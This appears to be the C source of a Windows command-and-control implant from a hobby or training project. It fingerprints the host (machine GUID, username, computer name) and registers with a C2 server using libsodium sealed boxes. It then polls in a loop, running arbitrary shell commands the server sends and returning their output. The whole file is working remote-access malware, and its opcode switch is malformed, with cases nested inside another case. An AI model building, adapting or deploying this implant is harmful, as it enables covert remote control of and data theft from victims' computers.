#define PB_ENABLE_MALLOC 1
#include "/home/ubuntu/BinaryBaddies/nanopb/pb_encode.h"
#include "/home/ubuntu/BinaryBaddies/nanopb/pb_decode.h"
#include "/home/ubuntu/BinaryBaddies/nanopb/pb.h"
#include "include/debug.h"
#include "implant.h"
#include "implant.pb.h"
#include <windows.h>
#include <sodium.h>
#include "include/execute.h"
#include "include/httpclient.h"
#include <stdio.h>
#include <string.h>
#include <iphlpapi.h>


#include "opcodes.h"


// Server's public key hardcoded - implants will use this to encrypt the initial registration message
unsigned char server_public_key[] = {
    0x75, 0x44, 0x89, 0x0c, 0x9f, 0x96, 0xaf, 0xde,
    0x9e, 0x10, 0x3a, 0xd9, 0x55, 0xaf, 0xac, 0xd4,
    0xe1, 0x63, 0x8d, 0x15, 0xba, 0x39, 0x81, 0xb7,
    0x7a, 0x27, 0x26, 0xc7, 0x79, 0xb0, 0x33, 0x75
};



LPBYTE ImplantID_PT1 = NULL; // MachineGUID
LPBYTE ImplantID_PT2 = NULL; // RandomBytes
LPBYTE ImplantID = NULL; // MachineGUID + RandomBytes


// Function to RegisterImplant message
BYTE *EncodeRegisterImplant(RegisterImplant *ri, size_t *bufferSize) {
	bool status = pb_get_encoded_size(bufferSize, RegisterImplant_fields, ri);
	if (!status) {
		DEBUG_PRINTF("Failed to get RegisterImplant size: \n");
		return NULL;
	}
	
	BYTE *registerBuffer = (BYTE *)malloc(*bufferSize);
	pb_ostream_t stream = pb_ostream_from_buffer(registerBuffer, *bufferSize);
	
	status = pb_encode(&stream, RegisterImplant_fields, ri);
	
	if (!status) {
		DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
		free(registerBuffer);
		return NULL;
	}

        // DEBUG_PRINTF("[+] Successfully encoded: %llu\n", stream.bytes_written);
	return registerBuffer;
}

// Function to encode the ImplantCheckin message
BYTE *EncodeImplantCheckin(ImplantCheckin *ic, size_t *bufferSize) {
  bool status = pb_get_encoded_size(bufferSize, ImplantCheckin_fields, ic);
  if (!status) {
    DEBUG_PRINTF("Failed to get ImplantCheckin size: \n");
    return NULL;
  }

  BYTE *checkinBuffer = (BYTE *)malloc(*bufferSize);
  pb_ostream_t stream = pb_ostream_from_buffer(checkinBuffer, *bufferSize);

  status = pb_encode(&stream, ImplantCheckin_fields, ic);
  if (!status) {
    DEBUG_PRINTF("Encoding failed: %s\n", PB_GET_ERROR(&stream));
    free(checkinBuffer);
    return NULL;
  }

  return checkinBuffer;
}

// Decode TaskRequest message
BOOL DecodeTaskRequest(LPBYTE result, size_t outboundBufferSize, TaskRequest *tReq) {
  pb_istream_t stream = pb_istream_from_buffer(result, outboundBufferSize);
  bool status = pb_decode(&stream, TaskRequest_fields, tReq);
  if (!status) {
    DEBUG_PRINTF("Decoding failed: %s\n", PB_GET_ERROR(&stream));
    return FALSE;
  }
  return TRUE;
}

// Free given TaskResponse
void FreeTaskResponse(TaskResponse *tResp) {
  if (tResp->Response != NULL) {
    free(tResp->Response);
    tResp->Response = NULL;
  }
}

int GetMachineGUID() {
	DWORD dwSize = 0;

	RegGetValueA(HKEY_LOCAL_MACHINE,
                        "SOFTWARE\\Microsoft\\Cryptography",
                        "MachineGuid",
                        RRF_RT_REG_SZ,
                        NULL,
                        NULL,
                        &dwSize);
	
	ImplantID_PT1 = malloc(dwSize);

	LONG res = RegGetValueA(HKEY_LOCAL_MACHINE,
			"SOFTWARE\\Microsoft\\Cryptography",
			"MachineGuid",
			RRF_RT_REG_SZ,
			NULL,
			ImplantID_PT1,
			&dwSize);

	if (res) {
		DEBUG_PRINTF("Failed to get MachineGUID\n");
		return 1;
	}
	return 0;
}

BYTE *GenerateRandomBytes() {
	HCRYPTPROV hCryptProv;
	
	if (!CryptAcquireContext(&hCryptProv,
				NULL,
				NULL,
				PROV_RSA_FULL,
				CRYPT_VERIFYCONTEXT)) {
		DEBUG_PRINTF("Error acquiring cryptographic context.\n");
		return NULL;
	}

	BYTE *randomBytes = (BYTE *)malloc(RANDOM_BYTES_SIZE);
	if (!CryptGenRandom(hCryptProv,
				RANDOM_BYTES_SIZE,
				randomBytes)) {
		DEBUG_PRINTF("Error generating random bytes.\n");
		CryptReleaseContext(hCryptProv, 0);
		return NULL;
	}
	CryptReleaseContext(hCryptProv, 0);

	return randomBytes;
}

int BytesToHexString(const BYTE *bytes) {
	if (bytes == NULL) {
		return 1;
	}
	
	ImplantID_PT2 = malloc(HEX_STRING_SIZE);
	const char *hexChars = "0123456789abcdef";
	for (int i = 0; i < RANDOM_BYTES_SIZE; i++) {
		ImplantID_PT2[i * 2] = hexChars[bytes[i] >> 4];
		ImplantID_PT2[i * 2 + 1] = hexChars[bytes[i] & 0x0F];
	}
	ImplantID_PT2[HEX_STRING_SIZE - 1] = '\0';

	return 0;
}

char* concat(const char *s1, const char *s2) {
    const size_t len1 = strlen(s1);
    const size_t len2 = strlen(s2);
    char *result = malloc(len1 + len2 + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    memcpy(result, s1, len1);
    memcpy(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}

// Function to set the ImplantID using the machine's GUID
char *SetID() {

	if (GetMachineGUID() == 1) {
		DEBUG_PRINTF("MachineID is not set...\n");
	}

	if (BytesToHexString(GenerateRandomBytes()) == 1) {
		DEBUG_PRINTF("RandomBytes is NULL...\n");
        }

	// DEBUG_PRINTF("ImplantID_PT1 = %s\n", ImplantID_PT1);
	// DEBUG_PRINTF("ImplantID_PT2 = %s\n", ImplantID_PT2);

	ImplantID = (LPBYTE )concat((const char *)ImplantID_PT1, (const char *)ImplantID_PT2);

	return (char *)ImplantID;
}


#include <sodium.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int RegisterSelf() {

    if (sodium_init() == -1) {
        printf("libsodium initialization failed.\n");
        return 1;
    }

    //key pair for the implant
    unsigned char implant_pk[crypto_box_PUBLICKEYBYTES];  // Public key
    unsigned char implant_sk[crypto_box_SECRETKEYBYTES];  // Secret key
    crypto_box_keypair(implant_pk, implant_sk);


    char public_key_base64[crypto_box_PUBLICKEYBYTES * 2]; 
    sodium_bin2base64(public_key_base64, sizeof(public_key_base64), implant_pk, sizeof(implant_pk), sodium_base64_VARIANT_ORIGINAL);


    RegisterImplant ri = RegisterImplant_init_zero;
    ri.ImplantID = (char *)ImplantID; 
    printf("IMPLANT GUID = %s\n", ri.ImplantID);

    // Get the current username
    DWORD usernameSize = MAX_PATH;
    char username[MAX_PATH];
    GetUserNameA(username, &usernameSize);

    // Get the computer name
    DWORD computerNameSize = MAX_PATH;
    char computerName[MAX_PATH];
    GetComputerNameA(computerName, &computerNameSize);

    // Assign computer name and username to the RegisterImplant structure
    ri.ComputerName = computerName;
    ri.Username = username;
    ri.Password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!";

    ri.PublicKey = public_key_base64;
    printf("COMPUTER NAME = %s\n", ri.ComputerName);
    printf("USERNAME = %s\n", ri.Username);
    printf("PUBLICKEY = %s\n", ri.PublicKey);


    size_t bufferSize = 0;
    BYTE *buffer = EncodeRegisterImplant(&ri, &bufferSize);
    if (!buffer) {
        printf("Failed to encode registration info\n");
        return 1;
    }

    //Encrypt the buffer using the server's public key
    unsigned char ciphertext[crypto_box_SEALBYTES + bufferSize];
    if (crypto_box_seal(ciphertext, buffer, bufferSize, server_public_key) != 0) {
        printf("Failed to encrypt registration info\n");
        free(buffer);
        return 1;
    }
    free(buffer);

    //Encode the ciphertext using Base64 encoding
    size_t base64_maxlen = sodium_base64_ENCODED_LEN(sizeof(ciphertext), sodium_base64_VARIANT_ORIGINAL);
    char *base64_ciphertext = malloc(base64_maxlen);
    if (base64_ciphertext == NULL) {
        printf("Error allocating memory for Base64\n");
        return 1;
    }
    if (sodium_bin2base64(base64_ciphertext, base64_maxlen, ciphertext, sizeof(ciphertext), sodium_base64_VARIANT_ORIGINAL) == NULL) {
        printf("Error encoding ciphertext to Base64\n");
        free(base64_ciphertext);
        return 1;
    }

    // Send the Base64 encoded ciphertext to the server
    size_t encryptedSize = strlen(base64_ciphertext);
    printf("Base64 encoded ciphertext: %s\n", base64_ciphertext);
    LPBYTE response = HTTPRequest(L"POST", C2_HOST, REGISTER_PATH, C2_PORT, C2_UA, (LPBYTE)base64_ciphertext, encryptedSize, &encryptedSize, USE_TLS);
    if (response != NULL) {
        printf("Register Sent! Response received.\n");
        free(base64_ciphertext);
        return 0; 
    }

    free(base64_ciphertext);
    return 1; 
}



// Check-in with Server
BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
	
	ImplantCheckin ic = ImplantCheckin_init_zero;
	ic.ImplantID = (char *)ImplantID;
	ic.Resp = tResp;

	size_t outboundBufferSize = 0;
	size_t inboundBufferSize = 0;
	BYTE *outboundBuffer = EncodeImplantCheckin(&ic, &outboundBufferSize);
	
	// LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);

	LPBYTE response = HTTPRequest(POST_VERB, C2_HOST, CHECKIN_PATH, C2_PORT, C2_UA				, outboundBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);

	/*
	if (response != NULL) {
		DEBUG_PRINTF("Register Sent!\n");
		free(response);
		return TRUE;
	}*/

	// FreeTaskResponse(tResp);
	// free(outboundBuffer);
	if (response != NULL) {
		// DEBUG_PRINTF("RESPONSE IS NOT NULL. SIZE IS %llu.\n", inboundBufferSize); 
		// DEBUG_PRINTF("RESPONSE IS: **%s**\n", response);
        
	}
	
	if (response != NULL && inboundBufferSize > 0) {
		BOOL status = DecodeTaskRequest(response, inboundBufferSize, tReq);
		
		//DEBUG_PRINTF("TREQ:\n");
		// DEBUG_PRINTF("    - TaskID = %ld\n", tReq->TaskID);
		// DEBUG_PRINTF("    - TaskID = %ld\n", tReq->Opcode);
		// DEBUG_PRINTF("    - TaskID = %s\n", tReq->Args);
        // DEBUG_PRINTF("    - TaskID = %d\n", tReq->TaskID);
        // DEBUG_PRINTF("    - Opcode = %d\n", tReq->Opcode);


		if (status && tReq->TaskID == NULL) {
			// No task to perform, null out the TaskResponse
			memset(tResp, 0, sizeof(TaskResponse));
		}
		free(response);
		return status;
	}
	
	if (response) {
		free(response);
	}

	return FALSE;
}

// Function to handle the opcode received from the C2 server
int HandleOpcode(TaskRequest *tr, TaskResponse *tResp) {
//	printf("%p\n", tr->Opcode); 	
    switch((tr->Opcode)) {
        case OPCODE_LS: {
            DEBUG_PRINTF("DOING LS\n"); 
            size_t stOut = 0;
            LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
            
            // warning unsafe for any command that isn't a string
            DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
            pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
            if (!bytes_array) {
                free(cmdOut);
                return 1;
            }
            
            bytes_array->size = stOut;
            memcpy(bytes_array->bytes, cmdOut, stOut);
            free(cmdOut);
            
            tResp->TaskID = tr->TaskID;
            tResp->Response = bytes_array;
            
            break; 
        }

        case OPCODE_EXEC: {
            size_t stOut = 0;
            LPBYTE cmdOut = ExecuteCmd(tr->Args, &stOut);
            
            // warning unsafe for any command that isn't a string
            DEBUG_PRINTF("EXEC: %s", (char *)cmdOut);
            pb_bytes_array_t *bytes_array = (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(stOut));
            if (!bytes_array) {
                free(cmdOut);
                return 1;
            }
            
            bytes_array->size = stOut;
            memcpy(bytes_array->bytes, cmdOut, stOut);
            free(cmdOut);
            
            tResp->TaskID = tr->TaskID;
            tResp->Response = bytes_array;
            
            break;
            
            case OPCODE_WHOAMI: {
                char username[MAX_PATH] = {0};
                DWORD dwSize = MAX_PATH;
                
                GetUserNameA(username, &dwSize);
                dwSize--;
                pb_bytes_array_t *bytes_array =
                (pb_bytes_array_t *)malloc(PB_BYTES_ARRAY_T_ALLOCSIZE(dwSize));
                
                if (!bytes_array) {
                    return 1;
                }
                
                DEBUG_PRINTF("Opcode: Username %s:%lu\n", username, dwSize);
                bytes_array->size = (size_t)dwSize;
                memcpy(bytes_array->bytes, username, (size_t)dwSize);
                tResp->TaskID = tr->TaskID;
                tResp->Response = bytes_array;
                break;
            }
            
            default:
            DEBUG_PRINTF("INVALID Opcode\n");
            return 1;
        }
    }
    return 0;
}

int main() {
    MessageBoxA(NULL,
        (LPCSTR)L"Malware Downloaded",
        (LPCSTR)L"Account Details",
        MB_OK);
	DEBUG_PRINTF("[+] Starting Implant.\n");
	
	if (RegisterSelf() == 1) {
		DEBUG_PRINTF("[!] Failed to register with the Server!\n");
		return 1;
	}
	printf("[+] Successfully registered Implant with Server!\n");

	TaskRequest tReq = TaskRequest_init_zero;
	TaskResponse tResp = TaskResponse_init_zero;
	
	while (1) {
		DEBUG_PRINTF("[+] Sleeping for %d milliseconds \n", SLEEP_TIME);
		Sleep(SLEEP_TIME);
		
		if (DoCheckin(&tResp, &tReq) && tReq.TaskID != NULL) {
			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
			HandleOpcode(&tReq, &tResp);
		} else {
			// No task to perform, null out the TaskResponse
			memset(&tResp, 0, sizeof(TaskResponse));
		}
	}

    // If reached here (shouldn't) best bet is going to be kill self.
	// Free the final task response before exiting
	// FreeTaskResponse(&tResp);
	return 0;
}
